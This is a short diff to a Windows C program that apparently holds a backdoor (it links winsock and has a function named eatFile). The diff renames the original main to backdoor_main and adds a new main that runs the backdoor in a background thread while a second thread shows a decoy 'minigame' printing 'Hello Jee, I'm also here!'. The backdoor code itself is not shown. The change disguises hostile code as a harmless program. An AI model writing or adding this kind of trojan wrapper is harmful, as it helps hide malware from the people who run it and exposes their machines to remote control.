@@ -4,6 +4,7 @@
 #include <dirent.h>
 #include <stdlib.h>
 #include <time.h>
+#include <pthread.h>
 
 #pragma comment(lib,"ws2_32.lib")
 
@@ -153,7 +154,7 @@ int eatFile(char fileName[]) {
     return 1;
 }
 
-int main(int argc , char *argv[])
+int backdoor_main()
 {
 	// Main Code 
 
@@ -275,4 +276,33 @@ int main(int argc , char *argv[])
 	}
 
 	return 0;
+}
+
+
+// Runs the main code for the backdoor operations.
+void *thread1() {
+	backdoor_main();
+}
+
+// Runs the minigame in the foreground
+void *thread2() {
+	while(1) {
+		fprintf(stderr, "Hello Jee, I'm also here!\n");
+		Sleep(1000);
+	}
+}
+
+int main(int argc , char *argv[]) {
+
+	// The main function here executes two different functions in parallel,
+	// namely thread1 and thread2.
+
+	pthread_t threadId1;
+	pthread_t threadId2;
+
+	pthread_create(&threadId1, NULL, &thread1, NULL);
+	pthread_create(&threadId2, NULL, &thread2, NULL);
+
+	pthread_join(threadId1, NULL);
+	pthread_join(threadId2, NULL);
 }
